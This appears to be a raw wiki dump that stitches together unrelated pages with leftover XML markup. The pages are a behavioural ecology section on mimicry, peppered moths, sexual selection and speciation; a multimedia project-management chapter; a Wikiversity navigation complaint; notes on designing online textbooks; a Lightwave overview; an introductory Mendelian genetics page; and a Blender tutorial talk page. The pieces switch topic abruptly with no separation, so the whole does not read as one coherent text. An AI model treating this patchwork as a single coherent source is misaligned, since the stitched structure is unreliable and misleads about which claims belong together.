One of the most popular types of mimicry involves the warning coloration found on inedible or toxic organisms such as the monarch butterfly.  Once these toxic organisms have adapted this warning coloration which warns predators to stay away, other organisms may start to mimic this warning coloration in an attempt to stay alive.  Batesian mimics are those mimics that imitate unpalatable species even though they are palatable.  Therefore, one species is harmful while the other is harmless.  The wasp is a great example of Batesian mimicry.  The wasp is the model species in this example as it possesses a sting which enables it to escape from predators.  The bright warning coloration of the wasp has been mimicked by many other insects.  Even though the mimics are harmless, the predator will avoid them due to bad experiences with wasps with the same coloration.  With Müllerian mimicry, many unpalatable species share a similar color pattern.  Müllerian mimicry proves to be successful as the predator only has to be exposed to one of the species in order to learn to stay away from all the other species with the same warning color patterns.  The black and yellow striped bodies of social wasps, solitary digger wasps, and caterpillars of the cinnabar moths warn predators that the organism is inedible.  This is a great example of Müllerian mimicry as all of these unpalatable, unrelated species have a shared color pattern that keeps predators away.

Mimicry is a very successful antipredator device that species have evolved over many generations. As one can see, organisms have come to mimic many different characteristics such as color patterns and behaviors.  However, selection only favors the mimics when they are less common than the model.  Therefore, the fitness of mimics is “negatively frequency-dependent.”

=====Example: Industrial Melanism of Peppered Moths=====
[[Image:Biston.betularia.7200.jpg|thumb|260px|''Biston betularia f. typica'', the white-bodied peppered moth.]]

Within one hundred years (1850 to 1950); the dotted whitish form of the peppered moth (''Biston betularia'') was almost entirely replaced by the melanic (black) form. The melanic form appeared to be best suited for survival against the soot that had collected on forest tree trunks from pollution because the moths could camouflage with their resting area on the tree. The dotted whitish form of the peppered moth was no longer predominant in this environment because they were easily detected and predated on. How does this happen? Many animals have anti-predator adaptations. Adaptations are defined as “a heritable trait that either spread because of natural selection and has been maintained by selection to the present or is currently spreading relative to alternative traits because of natural selection&lt;ref&gt;Alcock, J. 2001. Animal Behavior: An Evolutionary Approach (7 ed.) Sinauer Associates Inc., Massachusetts. pp. 341&lt;/ref&gt;.” Anti-predator adaptations suggest that a heritable trait, which enables the organism to hide from predators by seeking cover against a background, has spread by natural selection because of reproductive success. H.B. D. Kettlewell’s experiments on the peppered moths, as well as, those conducted by R.J. Howlett and M.E.N. Majerus have proven that the peppered moth’s preference for their resting places on trees are anti-predator adaptations.

In 1955, H.B. D. Kettlewell published his study on pepper moths: ''Selection Experiments on Industrial Melanism in the Lepidoptera''. Kettlewell hypothesized that the dotted whitish form of the peppered moth were more likely to be eaten than the melanic form because they could be easily detected against the soot covered trees. His studies showed that the moths that were easily identified by humans were at a higher risk of predation from birds. The dotted whitish form was at higher risk of predation than the melanic form in the polluted environment.

Howlett and Majerus further examined this hypothesis in their study: ''The Understanding of Industrial Melanism in the Peppered Moth'', published in 1987.  They tested it by pinning 50 of both forms of the peppered moths on pale and dark tree trunks.

Calculations:
'''Moths in Polluted (dark) Woodland'''

Dotted Whitish Form: (30/50) x 100 = 60%
Melanic Form: (20/50) x 100 = 40%

60% - 40% = 20%  The Dotted Whitish form is predated on 20% more than the melanic form in the polluted woodland.

'''Moths in Non-polluted (pale) Woodland'''

Dotted Whitish Form: (15/50) x 100 = 30%
Melanic Form: approx. (30/50) x 100 = 60%

60% - 30% = 30% The Melanic form is predated on 30% more than the dotted whitish form in the nonpolluted woodland.
----
Their studies showed that the dotted whittish form was preyed on 20% more than the melanic form in the polluted woodland. The melanic form is predated on 30% more than the dotted whitish form in the nonpolluted woodland. 

In addition to the difference in predation, their studies also showed that in both the polluted and nonpolluted environments the moths that were located on the limb joints instead of the trunks were less likely to be preyed on. 

Howlett and Majerus showed that the dotted whitish form was at a higher risk of predation when resting against the polluted (dark) trees. The melanic form had a greater chance of survival and reproduction because they were less likely to be detected against the soot-covered trees, the same findings of Kettlewell years before. Their experiment proved that the melanic form was an anti-predator adaptation, which is why the dotted whitish form had become so rare. The melanic form had become the dominant trait for survival and reproduction in the polluted woodland.

=====Example: Antipredator Adaptations used by the Monarch Butterfly=====

The relationship between prey and predators continually changes. Prey need to find ways to outsmart predators in order to survive and reproduce. One way monarch butterflies increase their fitness is by forming huge groups of up to ten million. Increasing group size lowers the probability that any one monarch butterfly will be captured.  This is known as the “dilution effect.” Moreover, butterflies located in the center of a large group are more likely to survive than those on the outside &lt;ref&gt;Pike K. 1999. Antipredator Adaptations by Monarch Butterflies. Entomology at Colorado State University, Posted in 1999. Colorado State University. Accessed December 6, 2004.&lt;/ref&gt;. Monarch butterflies that choose to migrate to closed-area overwintering sites are less likely to be attacked by a predator.  Also, by reacting as a group to the movement of a predator, monarch butterflies are better able to scare away predators. This “mass startle effect” is thought to stun the predators and provide time for the butterfly to escape (true shock and awe indeed). The aforementioned are collective ways in which the butterfly behaves in order to elude a predator.  There are, however, certain individual inherent features that the monarch butterflies possess that increase their probability of avoiding a predator.

Monarch butterflies contain chemicals that are toxic to many predators.  Evidently, this makes other similar but harmless species envious.  In Batesian mimicry, a palatable species attempts to mimic an unpalatable species in an attempt to increase its own fitness.  The monarch butterfly species is one that some Batesian mimics model themselves after perhaps because the monarch butterflies are so successful at avoiding predators &lt;ref&gt;Mappes J. &amp; RV Alatalo. 1997. Batesian mimicry and signal accuracy. Evolution 51: 2051-2053&lt;/ref&gt;.  The Batesian mimics, although they are not harmful to predators, experience increased fitness because they model a potentially harmful species such as the monarch butterfly. Although monarch butterflies do not gain an increase in fitness as models of Batesian mimics, they do benefit from [[wiki/Müllerian_mimicry|Müllerian mimicry]].  In Müllerian mimicry, two unrelated toxic species converge on a similar morphology.  If more than one unpalatable species has a similar morphological trait, then the predators may more easily recognize a Müllerian mimic as potentially harmful.  This saves both the mimics and the predators time and energy.  

For many years the viceroy butterfly (''Limenitis archippus'') was thought to be a Batesian mimic of the Monarch. As it turns out, the viceroy can, depending on its diet, be more unpalatable than the monarch, thus both species benefit from resembling the other because a predator eating either one may become ill and avoid both in the future.&lt;ref&gt;{{cite journal |last=Ritland |first=D.|coauthors=L. P. Brower|year=1991 |month= |title=The viceroy butterfly is not a Batesian mimic |journal=[[Nature (journal)|Nature]] |volume=350 |issue= |pages=497–498 |doi =10.1038/350497a0  |url=http://www.nature.com/nature/journal/v350/n6318/abs/350497a0.html |accessdate= 2008-02-23 |quote=Viceroys are as unpalatable as monarchs, and significantly more unpalatable than  queens from representative Florida populations.}}&lt;/ref&gt;  Thus both species are examples of Müllerian mimicry.

Monarch butterflies display aposematism or warning coloration. This warning coloration is meant to be very conspicuous. Monarch butterflies make themselves conspicuous by having bright orange areas on its wings.  Predators quickly learn that prey containing these bright colors are potentially harmful.  For example, when a blue jay consumes a monarch butterfly, it vomits shortly after.  From that point on, the blue jay associates features of the monarch butterfly, such as its bright colors, as unpalatable. Because of their morphological features, Batesian mimics, Müllerian mimics, and many other aposematic species all gain from the monarch’s unpalatability.

====Sexual Selection====

Sexual selection, a subcategory of natural selection, was first recognized by Charles Darwin and occurs when individuals differ in their ability to compete with others for mates or to attract members of the opposite sex. By heavy courtship, fighting, or large territorial possession, males heavily compete for females. Even though a male may win a fierce competition for the mate of his choice, it is ultimately the female who decides on a partner that she wants. The female is often successful in her attempts to control reproduction by being choosy and having particular preferences for a male mate.

Females typically have a relatively larger investment in producing offspring. While a single male can often fertilize all of a female's eggs, she will not produce more offspring by mating with more than one male. By and large, a male's reproductive success increases with the number of mating opportunities he obtains, whereas a female's reproductive success is largely limited by how many offspring she can physically bear &lt;ref&gt;Clutton-Brock TH. 1990. Reproductive Success: Studies of Individual Variation in Contrasting Breeding Systems. University Of Chicago Press.&lt;/ref&gt;. This results in sexual selection, in which eager males compete with each other, and females become choosy in which males to mate with. Bateman's studies on mating behavior in fruit flies&lt;ref&gt;Bateman AJ. 1948. Intra-sexual selection in ''Drosophila''. Heredity 2: 349-368&lt;/ref&gt; suggested that  the origins of  the unequal investment reside in the fact that male gametes (sperm) are cheaper to produce than eggs. Animals are therefore fundamentally polygynous, as a result of being anisogamous.
*A female can have only a limited number of offspring, whereas a male can have a virtually unlimited number, provided that he can find females willing to mate with him. Thus females generally need to be much choosier about who they mate with.
*A male can easily produce sperm in excess of what it would take to fertilize all the females that could conceivably be available [...] Hence the development of the masculine emphasis on courtship and territoriality or other forms of conflict with competing males.&lt;ref&gt;Williams GC. 1966, Adaptation and natural selection: a critique of some current evolutionary thought. Princeton, N.J: Princeton University Press&lt;/ref&gt;
*In most animals the fertility of the female is limited by egg production which causes a severe strain on their nutrition. In mammals the corresponding limiting factors are uterine nutrition and milk production, which together may be termed the capacity for rearing young. In the male, however, fertility is seldom likely to be limited by sperm production but rather by the number of inseminations or the number of females available to him... In general, then, the fertility of an individual female will be much more limited than the fertility of a male... This would explain why in unisexual organisms there is nearly always a combination of an undiscriminating eagerness in the males and a discriminating passivity in the females.
*Among polygynous species, the variance in male reproductive success is likely to be greater than the variance in female reproductive success.&lt;ref&gt;Huxley JS. 1938. 'The present standing of the theory of sexual selection', in de Beer, G.R., Evolution: Essays on aspects of evolutionary biology, Oxford: Clarendon Press, pp. 11-42&lt;/ref&gt;
*The female, with the rarest exceptions, is less eager than the male... she is coy, and may often be seen endeavouring for a long time to escape.&lt;ref&gt;Darwin CR. 1871. The Descent of Man and Selection in Relation to Sex, Hurst and Co.&lt;/ref&gt;

=====Intersexual Choice: Why does she consider the trait &quot;attractive&quot;?=====

Females choose mates based on many factors. One important factor is male adornments, or ornaments. For example, Marion Petrie and Tim Halliday concluded that the removal of eyespots from a peacock's tail significantly reduces his attractiveness to females. Thus, females are extremely conscious of the visual stimuli provided by males. Other factors involved in female preference in mate selection include body coloration or &quot;gifts&quot; the male may present to the female before copulation. A mother is expected to always want the best for her child, even if it is a future child. Females select mates with certain traits, because they want their children to be healthy, viable, and reproductively successful. A direct and heritable benefit of mate choice by females is the assurance of bearing offspring that will survive well and display high general fitness. Non-genetic benefits of mate choice include fecundity advantages, food, parental care, or a good territory. All of the benefits, both heritable and nonheritable, ultimately lead to the greater survival of a female's offspring.

:*'''Passive Attraction Theory''': Sensory Bias, conspicuous signals make an individual more likely to attract the attention of a mating partner. Elaborate sensory cues alert the female that the male is reproductively superior to others. Male adornments may more readily elicit the mating responses of some females who will thus mate preferentially in favour of the adorned males &lt;ref&gt;Bateson P. 1983. Sexual Selection by Female Choice by Peter O'Donald. in Mate Choice. (pp.53). Cambridge: Cambridge University Press.&lt;/ref&gt;. 
:*'''Nuptial gifts''': spermatophore; territory, protection, resources; courtship indicative of parental investment. e.g., Dung beetle
:*The '''Good Genes Hypotheses''' regards assessment of the mate's state of health as a general indicator of viability and quality. Females exhibit mate choice in order to provide their offspring with a partner's genes that will advance their offspring's chances of survival or reproductive success. The '''healthy mate theory''' occurs when females prefer males healthy enough to produce and maintain elaborate ornaments. A good example of this is in female house finches, who choose male mates based on their bright coloration. Bright coloration tells the female that the male is more resistant to pathogens and parasites. In Hamilton and Zuk's &quot;Revealing Signal Theory&quot; bright ornaments reveal a genuinely healthy individual in good condition. In conditions where parasites ralter male showiness and parasite resistance is largely inherited, females ought to choose those with bright coloration.
:*Zahavi's '''Strategic Choice Handicap Theory''': the presence of a costly trait is indicative of otherwise good underlying genes that allow an individual to prosper despite this handicap
:*Fisher's '''Run-away Selection''': Females that mate with attractive males are compensated for reduced fecundity by bearing attractive offspring with higher than average mating success &lt;ref&gt;Andersson M. 1994. Costs of Mate Choice; Direct Benefits of Mate Choice. In Sexual Selection. Princeton, New Jersey: Princeton University Press.&lt;/ref&gt;. This &quot;Sexy Sons Hypothesis&quot; works by alligning the presence of a particular morphological characteristic in males with a preference for it in females. Choosy females create a positive feedback loop favoring both males with these attributes and females that prefer them. 
:*'''Genetic Compatibility''': MHC locus genes in human mate choice
:*The '''Good Parent Theory''' suggests that choosy individuals ought to select partners on the basis of how well they will care for their offspring, e.g. as the female searches for a paternal male.

=====Inbreeding=====

Inbreeding refers to an elevated amount of breeding between close relatives. The resulting increase in homozygosity of the population exposes recessive, deleterious traits in homozygous form and may lead to inbreeding depression where inbred individuals exhibit reduced health and fitness and lower levels of fertility.

=====Outbreeding=====
The introduction of genetic material from unrelated individuals into a breeding line increases genetic diversity, thus reducing the incidence of disease or genetic abnormalities. It is used in breeding to restore vigor, size and fertility to a breeding line.

=====Sexual Selection and Ornamentation in Males=====
'''Sexual selection''' refers to the process by which changes in gene frequencies result from individuals that are better than others at either competing for or at attracting mates -- it is the evolution of traits based on differences in mating success among individuals if (1) some traits increase the ability to compete with individuals of the same sex for access to mates, or (2) some traits increase the ability to attract individuals of the opposite sex. Ornamentation in males, which are commonly the competing sex, may result from different evolutionary forces. Sexual selection is always harsher on the competing sex.
*'''Species recognition''' Ornamentation in breeding individuals may serve in a quick recognition of others as members within a pool of genetically compatible breeding partners.

=====Intrasexual Competition and interference=====
Dominant individuals often gain preferred access to mates, desirable territory, or other advantages that will enhance the individual's chances for transmitting its genes into future generations.
*Precopulatory: A common form is based on an individual's ability to physically dominate a rival. In situations where groups of mates can be readily monopolized this will likely lead to increasing size in the competing sex. Fur seal females, which rely on a small stratch of beach for giving birth, can be monopolized easily in harems. 

Winning in ritualized contests, producing a louder signal, or masking an opponent's call; dominance in social groups; territorial exclusion; alternative mating strategies; sexual interference 

Postcopulatory: 
*mate guarding;
*anti-aphrodisiacs;
*mating plugs; partners remain attached e.g. wolves; 
*'''Bruce effect''' is a form of pregnancy disruption when a female mammal is exposed to an unknown male&lt;ref&gt;Bruce HM. 1959. An exteroceptive block to pregnancy in the mouse. Nature 184: 105.&lt;/ref&gt;. Examples may also include post-implantation failure in many species of rodents &lt;ref&gt;Storey AE &amp; DT Snow. 1990. Postimplantation pregnancy disruptions in meadow voles: Relationship to variation in male sexual and aggressive behavior. Physiology and Behaviour 47: 19–25&lt;/ref&gt;.
*Infanticide
*sperm competition: e.g. primate or bat mating systems

===Basic Models of Molecular Evolution===

====Adaptational Models====
Adaptational Models are rooted in the view that natural selection plays the dominant role in structuring an organism's morphology, physiology, and behavior. The extant phenotype thus is the product with adaptations that have its possessor allowed to reproduce more successfully than individuals with alternative traits.

====Neutralist Models====
Alternative accounts for the evolution of traits focuses on genetic drift as a primary determinant for characteristics ranging from genes to complex traits. This acknowledges a significant role for historical contingencies, where present phenotypes of population members are largely determined by the genetic makeup of a small number of founding individuals. Although this view does not deny the role of natural selection in determining the course of adaptive evolution, the theory attributes a large role to genetic drift. When one compares the genomes of existing species, the vast majority of molecular differences do not influence the fitness of the individual organism. As a result, the theory regards differentiation in such features as neither subject to, nor explicable by, natural selection. Theoretical considerations suggest that such a process is most effective in small populations and when selecting among traits that are largely adaptively neutral.

===Speciation and Macroevolution===

Speciation is the evolutionary process by which new biological species may arise. Natural speciation has taken place over the course of evolution, although the relative importance of different mechanism in driving biodiversity remains a subject of debate. Debate also relates to the rates at which speciation events may occur over geologic time. Although some evolutionary biologists claim that speciation events have remained relatively constant over time (i.e., '''Phyletic Gradualism'''), palaeontologists such as Niles Eldredge and Stephen Jay Gould have argued that species may remain unchanged over long periods of time with speciation occurring in relatively brief intervals (i.e., '''Punctuated Equilibrium''').

[[Image:Speciation modes.svg|right|thumb|300px|Comparison of allopatric, peripatric, parapatric and sympatric speciation.]]

====Allopatric Speciation====

In allopatric speciation, two subgroups of a population become geographically isolated from each other (i.e., allopatric populations) through geographical or geological events. As these isolated populations undergo genotypic and phenotypic divergence, they are subjected to different selective pressures and may undergo genetic drift. New species form when the populations evolve independently such that they are no longer able of exchange genes when they come back into contact.

====Peripatric and Parapatric Speciation====

New species are formed when isolated, small peripheral populations split from the main population and occupy a novel ecological niche. Since small populations often undergo bottlenecks, genetic drift may drive the latter into significant genetic divergence (i.e., peripatric specieation). If geography only accounts for a partial separation, individuals of each species may come in contact across the barrier from time to time, but reduced fitness of heterozygotes leads to selection for reproductive barriers that prevent breeding between the two species.

====Sympatric Speciation====
In symptric speciation species diverge while inhabiting the same place. This may happen when a diploid cell undergoes failed meiosis, producing diploid gametes, and self-fertilizes to produce a tetraploid zygote. Alternatively, subgroups of a species may become dependent on different host organisms within the same area. With reduced fitness of heterozygotes, the emergence of reproductive barriers will drive the groups towards two distinct species.

[[Category:Advanced Interactive Media|{{SUBPAGENAME}}]]

A multimedia project, in any field – corporate, educational, private, or otherwise – is one of the hardest to define or manage. While a standard project, such as construction, have a set time, resources, cost and goals, all these points are interdependent and overlap in a multimedia project. This overlapping of the different project elements is precisely what makes it so hard to manage. In this chapter we will discuss a hypothetical project scenario, and walk it through from beginning to end. It is our goal to have you, the reader, come away with a healthy respect for this type of work, and to understand what goes into it.

To begin any project, it must first be mapped out. This includes identifying the client, the target audience or who the product is being made for, what type of multisensory experience will be created, project goals, costs, resources, manpower, and of course, the deadline or when it needs to be finished.



== '''IN  MULTI-MEDIA... “Quality&quot; is difficult to define''' ==


One difficulty in the process of multimedia management and production that is rarely, if ever, addressed is the difficulty in defining “quality” in meaningful terms. When one begins to identify the obstacles concerning a given project, it is logical to begin by screening the list of tasks and procedures for “hang-ups” in reference to time, money, client relations, team work, communication, and the like.  However, these are really all contingent upon the prior definition of quality. The project is only finished when it has passed the client’s vision of quality.  This client-based, relative, subjectively defined standard of “quality” is difficult to establish. It must be devised anew for each new project, with each new client.


Authors Elaine England and Andy Finney have attempted to defining “quality” in their book ''Managing Multimedia: Project Management for Interactive Media''. They write the following:



'''“Design quality for media projects = Content and treatment agreement.”'''

&quot;Looking at the future of Interactive Multi-sensory Media&quot; :Aiwink824.

The future of  Interactive technology is already here and it is only going to get better.  Today when have “ I-Phones” that allow  friends to e-mail each other in real time, search for information, directions and get your pin point locations  with google maps.  Right now the only way today’s technology interacts, is if you interact with it first.  The best  we can get now is  proactive interactivity, like video games with complex tasks or complex websites.  Gamers are pushing the envelope with social gaming, playing each other over the internet.  The future is  mutual interactivity or  virtual reality with connections to the central nervous system.  With people who are playing games to get away from realty  this is the next best thing.  Virtual reality might be able to give people in comas new life and help with medical research. Other examples are the &quot;Nintendo   Wii&quot; and militaries using simulators  to train soldiers.</text>

A link at the bottom of this page says: '''Next''': Quadratic functions.

But when I look at the content page of http://en.wikiversity.org/wiki/Topic:High_School_Mathematics I see:

...

    * Solving equations
    * Solving linear inequalities
    * Functions

Further algebra and calculus
 
...

Quadratic functions are the first item in Further Algebra and calculus.

May I find this a bit confusing??

Ohlala!! I see that the Wikiversity contents page gives me a mix of items. Some of them from the Wikibook &quot;Algebra&quot; and others from the Wikibook &quot;Calculus&quot;. All with the original links ?? No wonder I got confused ! With all due respect I think that especially Wiki-mathematicians of all branches should avoid such cross-breeding.

      <text xml:space="preserve">==A New Learning Paradigm==
OK, now it is time for the big concept.

How do we make online books that take advantage of the medium and yet retain the advantages of decades of textbook design?

The modern textbook has many design characteristics that should be transferred to the online textbook. 
For example, new keywords are bolded and often a glossary definition is included in the margin on the side of the book.
We can simulate that by alternate text in the case of short definitions, or pop up definition windows, or links to new pages. 

Also, the use of animated gifs, flash animation and other tools allow you to enhance the documents in ways that are superior to books.

Video demonstrations could also be included in the work.

This book is a poor attempt at trying to make that new type of document, the online textbook that teaches the class.

If you have ideas about how to design good online textbooks, feel free to post here. Your comments are appreciated.

==Challenges==

I've found myself challenged when I try to write this book. Not primarily for the words, but with the format.

===navigation===
Navigation is a problem for me.
I made a navigation bar, but I must enter the order manually each time I make a page. If I add a new page, I must change the numbers on the two pages that it is between. There needs to be a way to automatically generate navigation information.

Also, I have divided each section into easy, intermediate, and hard topics. I would like to have a special navigation method so that you could view only the easy parts if you wanted. In fact, I want a book that reorders itself for the user.

===searching===
An index is the traditional way to find something in a book. Not only do we need to add useful indexes, but I want to add a search index for this book.


==Features==
I have begun adding audiofiles. I have started with readings in the photosynthesis section and may add more.</text>

One of the industry leading software for motion graphics is Lightwave.  Maya monopolized character animation (for film, cartoon, etc.), but most professionals agree that Lightwave is a superior tools for motion graphics like the kind you see on sports shows and openers for TV programming.

3-D software can be overwhelming on first encounter because the professional tools are more complex than video/audio editing software and other multimedia software products.  The learning curve is well-worth it when you realize how 3-D expertise can set apart your work in a very competitive job market.

Wikipedia tells us, &quot;LightWave gained fame as the program used to create special effects for the Babylon 5, Star Trek Voyager and seaQuest DSV science fiction television series; the program was also utilized in the production of Titanic as well as the recent Battlestar Galactica TV-series, Sin City and Star Wars movies.&quot; Most recently though, Lightwave was used for the special effects and environmental effects in the film, &quot;300.&quot;&lt;br&gt; ''Quote reference:'' http://en.wikipedia.org/wiki/Lightwave&lt;br&gt;
''External link:'' http://www.newtek.com/lightwave/profiles/300/index.php

Lightwave is not only used for motion graphics however. It, like Maya, is used to create still images of 3d renders for use in graphic designs. Graphic artists have been known to utilize the imported image data from Lightwave as focus points for artwork or for complimentary geometry within a design.

The actual Lightwave program consists of two separate programs that were designed for specific tasks.&lt;br&gt;
&lt;table width=&quot;513&quot; border=&quot;1&quot;&gt;
  &lt;tr&gt;
    &lt;td width=&quot;106&quot; height=&quot;68&quot;&gt;&lt;div align=&quot;center&quot;&gt;Modeler&lt;/div&gt;&lt;/td&gt;
    &lt;td width=&quot;391&quot;&gt;&lt;div align=&quot;center&quot;&gt;Modeler is the application within the Lightwave package that allows the user to create or manipulate 3D models within a limitless workspace. &lt;/div&gt;&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td height=&quot;68&quot;&gt;&lt;div align=&quot;center&quot;&gt;Layout&lt;/div&gt;&lt;/td&gt;
    &lt;td&gt;&lt;div align=&quot;center&quot;&gt;Layout is the application within the Lightwave package that allows lighting and animation to be added to models that were created within Modeler. &lt;/div&gt;&lt;/td&gt;
  &lt;/tr&gt;
&lt;/table&gt;

      <comment>/* Why do children look like combinations of their parents? */</comment>
      <text xml:space="preserve">==Why do children look like combinations of their parents?==

Children often look like some combination of their parents. This is because each parent gives the child some of themselves {gene}. A child is made from the information found in the cells of the parents. These characteristics are called '''genes'''.

The traits that you can observe in a person are called that person's '''phenotype'''. The information that makes a person look the way they do is encoded in structures called ''chromosomes'' that are found in their cells. The specific genes found on these chromosomes make up what is called that person's '''genotype'''.

In humans, each person has two copies of each type of chromosome. That means they have two copies of each gene, but a person will give only one of these genes to their child. For example, a person could have a gene for brown hair and a gene for blond hair. He would give one of those traits to his child. The child's phenotype would depend on what gene he received from his other parent.

So children look like combinations of their parents because they are. Each parent gives half of their genetic material to their children. The combination makes a unique combination of their parents genes.

The scientific study of how traits are passed from parents to children is called '''genetics'''.

Chromosomes in the nucleus of the cell contain information of inheritance of features from parents to next generation in the form of DNA (Deoxyribo Nucleic Acid) molecules

==Who discovered modern Genetics?==
A monk named '''Gregor Johann Mendel''' who lived in the early to mid 1800s in the town of Brünn (now part of the Czech Republic) is considered the founder of modern genetics.

Gregor Mendel had studied statistics in Vienna and he wanted to bring some of the mathematics of that discipline to the study of plant breeding. He grew sweet pea plants and counted the properties of the children of hybrid crosses through generations to try to discern the rules that governed the transfer of properties from parent to child.

==Why sweet peas?==
Because sweet peas had clear unambiguous traits such as flower color and seed color. These traits made it easy to get good data.

==What did Mendel discover==

'''Mendel's First Law''' - The law of segregation
This law states that each parent has two copies of each trait (gene), but they only give one trait to their offspring and which one they give is random.

When one uses symbols to show the passage of traits, then one easily gets the 3:1 ratio that Mendel found in the second generation when he crossed true-breeding plants.

'''Mendel's Second Law''' - The law of independent assortment
If you look at more than one trait such as coat color and flower color, these traits will sort independent of each other. The chance of getting one or the other coat color gene is 50/50 and the chance of getting one or the other flower color gene is also 50/50, therefore the ratio of the combinations of the two traits are decided purely by chance.
==What do those strange terms mean?==
''Phenotype'' - An expressed gene, what an organism looks like.

''Genotype'' - What is in the genes. Which alleles and organism has.

''Allele'' - Two or more different forms of the same trait such as blue eyes and brown eyes.

==What's a genetic cross?==
A Genetic cross is a way of predicting the traits of the offspring of two parents.

A. ''Monohybrid cross'' - A monohybrid cross is a cross looking at only one trait at a time.
If the parents are true-breeding, there will be a 3:1 phenotypic ratio in F2.

B. ''Dihybrid cross'' - A Dihybrid cross is a cross looking at two traits at a time.
If the parents are true-breeding, there will be a 9:3:3:1 phenotypic ratio in F2.

C. A ''Test cross'' (Also called a ''backcross'')- Is a cross with the homozygous recessive parent. It reveals the genotype of an individual with a dominant phenotype.

===How does one solve a genetics problem correctly?===
Follow these steps:
1. Write down the phenotype of the parents.

2. Write down the genotype of the parents.

3. Write down the gametes that each parent can give.

4. Show all possible combinations of these gametes. (A Punnett square makes this easy).

5. Figure out the phenotype for each of the genotypes shown in the square.

6. Count the number of organisms with each phenotype and write a ratio.




Relationship between Genotype and Phenotype.
Chromosomes are where genes reside.

''Definitions:''

'''phenotype:''' The trait that that you can see. &lt;br&gt;
'''genotype:''' What traits are carried in the genes on the chromosome.&lt;br&gt;
'''Dominant:''' The trait that is visibly expressed. (e.g. Y yellow seed coat)&lt;br&gt;
'''Recessive:''' The trait that is hidden. (e.g. y green seed coat)&lt;br&gt;
'''Homozygous:''' having two identical genes. (e.g. yy or YY)&lt;br&gt;
'''Heterozygous:''' Having two different genes. (e.g. Hh )&lt;br&gt;
'''Gametes: '''The haploid sex cells.&lt;br&gt;
'''Truebreeding:''' The parents are homozygous for a trait (e.g. YY)&lt;br&gt;


In Classical Mendelian Genetics, each trait can be either dominant or recessive. When two true breeding parents are crossed, the recessive trait is hidden in the offspring, only to reveal itself later in the grandchildren.

The classic ratio for a monohybrid cross with straight dominance is 3:1 Dominant to recessive in the F2.

The classic ratio for a dihybrid cross with straight dominance is 9:3:3:1 in the F2.

{{Genetics/Exercise|Problems|
1. A true breeding plant with yellow seeds (YY) is crossed to a plant with green seeds (genotype yy).  Yellow is dominant to green. Draw the first filial (F1) and second filial (F2)cross. What is the genotypic and phenotypic ratio of the offspring?

2. A true breeding cat with a striped coat (SS) is crossed to a cat with a solid colorcoat(ss).  Show the F1 and F2 generations (show gametes for each cross).

      <comment>/* Create the outside faces - FKEY */ new section</comment>
      <text xml:space="preserve">== troubles with making the the outside faces of the wheel ==

so everyone knows, it works as written in 2,49b as of this date [[User:Pearts|Pearts]] ([[User talk:Pearts|talk]]) 20:08, 14 July 2010 (UTC)

''(A Noob: I'm using Blender 2.45, and using the F key and selecting auto doesn't do anything. A little help?)&lt;br&gt;
(another Noob: I'm also using Blender 2.45 and I don't even need to follow this step, as my tire already has an outside. I'm guessing you're encountering the same)&lt;br&gt;

''(THE Noob: I'm using Blender 2.46, and i just skipped the SPACEBAR bit, and selected everything with AKEY and pressed F to fill in the missing parts, works fine.&lt;br&gt;

''NOTE: In Blender 2.42a pressing F gives a menu with Make and Clear options. Choosing Make says &quot;No faces selected to make FGon&quot;. How do I make the faces? &lt;b&gt;Answer:&lt;/b&gt; I'm using Blender 2.44 and pressing F gives a menu where you can choose Auto.

''(Yet another Noob: I'm using 2.37.  Couldn't find any way to use Fkey globally.  Deselected all, then selected
outer vertices in sets of four, then pressed Fkey to get a face.  Repeated many times to complete.  Does someone
have a better idea for the older versions? )''&lt;br&gt;

''(Another Noob: In 2.42a the tire looks terrible if one manually selects the outside vertices and then makes faces with F and subsurfs. Better to make a tube, not a cylinder, a tube with 16 vertices, extrude outward, subsurf it, duplicated it with Shift-D and then rotate that a little along the Y axis to fill in the gaps.  Looks better. And it's a much faster procedure too!)''&lt;br&gt;

''(Noob Asking: Is there an easy way to eliminate the double vertexes and the hidden geometry or does it has to be one by one?? &lt;b&gt;Select all the Vertices with the A key and then click &quot;Rem Doubles&quot; in Edit mode.&lt;/b&gt; )''&lt;br&gt;

(user comment: the pics dont show for me)

(User note)Whenever I selected the vertices and tried to make a face I got an error message saying &quot;Cannot make polygon with  
interior vertices&quot; Do you know what I could do to fix this?
 
Reader note) Instead of creating all those faces manually you can add two tubes. Select both tubes with '''AKEY''' and scale as 
explained above. Deselect everything with '''AKEY'''. Place your mouse cursor on one of the vertices and press '''LKEY''' - this 
will select only one tube. Extrude as explained above. Deselect current vertices and select all (both tubes) by pressing '''AKEY''' 
twice. Press '''WKEY''' and click on  &quot;Remove doubles&quot;. As far as I can tell it works fine and saves you a lot of clicking.
Turn the viewport to '''NUM3''' to see the tire's profile.  Reduce the width of the tire to a width of 3 units by using the same 
technique of multiple vertice select.  When you are done, return the viewport to '''NUM1'''.

(Reader note) I have found it faster to &quot;lasso&quot; select using CTRL+LMB.

(Reader note)With version 2.43, all you need to do is lasso select all of the outside vertices in the front view. Then, press the '''FKEY'''.A window will pop up, and you simply click on '''auto''' and it does it all for you.

(NOTE) HOW DO YOU SELECT MORE THAN ONE???

== Too much rambling?! ==
Well, i'm probably not the target of the tutorial (I am well past that level), but i just read it, and thought that it is pretty confusing with all these noobs and user notes.
Wouldnt it be better to strip the tutorial down to the base text, that make up the tutorial, and then put all the USER / NOOB notes / READERS comments in here, and then adress it at the end or start of the text instead?
Hope i make sense, ahvent slept all nigth

i agree! [[User:Pearts|Pearts]] ([[User talk:Pearts|talk]]) 00:54, 15 July 2010 (UTC)

I also agree. Those comments should be simply removed and there should be one correct explanation.[[Special:Contributions/91.66.152.41|91.66.152.41]] ([[User talk:91.66.152.41|discuss]]) 22:24, 19 May 2013 (UTC)

== Another way to select before creasing the edges ==

*Titlescreen says
You could also consider selecting the outside faces on the tyre (the bit that will touch the road) and subdividing them once. Then you can selected a &quot;left face&quot; go down one and select a &quot;right face&quot; etc until you have gone round the wheel. You should have a checkerboard selection on the tyre. Then press E to extrude &gt; Individual faces and pull them out a bit. now press SHIFT + E to crease the edges and you will have a thick and chunky tyre tread.

== Problems with tutorial - Blender 2.49 ==

I am having a lot of troubles with this tutorial and its very annoying. First of all, I can't make it keep the faces after subsurfing. It looks like a bead necklace but the triangles are not around it. I also have problems with adding the second cylinder: It says to do so from the NUM7 view but doing so makes them sideways, and in the center of the tire, so moving along the Z axis makes it worse! Please help!

that is an align to view problem i'll add the warning at the top, it will show you the way. [[User:Pearts|Pearts]] ([[User talk:Pearts|talk]]) 23:46, 6 August 2010 (UTC)

